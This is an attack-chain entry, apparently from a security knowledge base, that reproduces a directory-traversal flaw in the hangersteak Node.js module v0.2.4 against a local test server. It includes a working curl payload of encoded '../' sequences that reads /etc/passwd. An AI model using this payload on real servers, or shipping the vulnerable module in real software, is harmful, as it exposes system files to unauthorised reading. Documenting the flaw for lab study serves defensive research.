---
id: ac-hangersteak-traversal-001
tags:
  - directory-traversal
  - path-traversal
  - node-js
  - arbitrary-file-read
type: attack_chain
tools:
  - '[[tools/npm]]'
  - '[[tools/nodejs]]'
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
verified: false
platforms:
  - Web
  - Node.js
  - Linux
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Install-Vulnerable-Hangersteak-Module]]'
  - '[[procedures/Create-Hangersteak-Server-Script]]'
  - '[[procedures/Start-Hangersteak-Server]]'
  - '[[procedures/Exploit-Directory-Traversal-with-Curl]]'
step_count: 4
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-14T17:26:05.559Z'
description: >-
  Multi-stage attack exploiting directory traversal in hangersteak v0.2.4 to
  read arbitrary files on a Node.js server.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
---
# Directory Traversal in Hangersteak Node.js Module to Read Arbitrary Files

Multi-stage attack chain demonstrating exploitation of a directory traversal vulnerability in the hangersteak Node.js module (v0.2.4), allowing arbitrary file reads on the target host via crafted HTTP requests.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Install Module] --> B[Setup Server]
    B --> C[Start Server]
    C --> D[Exploit Traversal]
    D --> E[Read Arbitrary Files]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#9b59b6
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/npm]]
- [[tools/nodejs]]
- [[tools/curl]]

### Target Environment

- Node.js runtime environment
- Linux-based host (for /etc/passwd access)
- Port 3006 open for HTTP server

### Initial Access Requirements

- Local or remote access to install and run Node.js scripts
- Network access to the server on port 3006
- No credentials required for exploitation once server is running

## Detailed Attack Procedures

### Step 1: Install Vulnerable Module
procedure: [[procedures/Install-Vulnerable-Hangersteak-Module]]

**Objective**: Set up the vulnerable environment by installing hangersteak v0.2.4.

**Instructions**: Use [[commands/npm-install-hangersteak]] to install the module from the npm registry.

```bash
npm install hangersteak
```

**Expected Output**: Installation logs confirming download and setup of hangersteak@0.2.4.

**Success Indicators**:
- Package installed in node_modules
- No errors in npm output

### Step 2: Create Server Script
procedure: [[procedures/Create-Hangersteak-Server-Script]]

**Objective**: Prepare a simple HTTP server script that uses the vulnerable hangersteak module to serve static files.

**Instructions**: Manually create an index.js file with the following content:

```javascript
const http = require('http');
const hangersteak = require('hangersteak');
http.createServer(hangersteak).listen(3006);
console.log('Server running on port 3006');
```

Save it as index.js in the project directory.

**Expected Output**: Valid JavaScript file ready for execution.

**Success Indicators**:
- File created without syntax errors
- Module require statements resolve correctly

### Step 3: Start the Server
procedure: [[procedures/Start-Hangersteak-Server]]

**Objective**: Launch the HTTP server to expose the vulnerability.

**Instructions**: Execute [[commands/nodejs-run-server]] to start the server on port 3006.

```bash
nodejs index.js
```

**Expected Output**: Console message "Server running on port 3006".

**Success Indicators**:
- Server listening on 0.0.0.0:3006
- No startup errors

### Step 4: Exploit Directory Traversal
procedure: [[procedures/Exploit-Directory-Traversal-with-Curl]]

**Objective**: Send a crafted request to traverse directories and read sensitive files like /etc/passwd.

**Instructions**: Use [[commands/curl-directory-traversal]] to send a GET request with URL-encoded '../' sequences.

```bash
curl "http://localhost:3006/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
```

**Expected Output**: Contents of /etc/passwd file displayed in terminal.

**Success Indicators**:
- Arbitrary file contents retrieved
- No 404 or access denied errors

## Attack Chain Summary

### Key Achievements

1. Successful installation and setup of vulnerable Node.js module
2. Exposure of static file server vulnerable to path traversal
3. Remote reading of system files over the network

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[File and Directory Discovery]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Discovery]]

---
*Last updated: 2023-10-01T00:00:00Z*
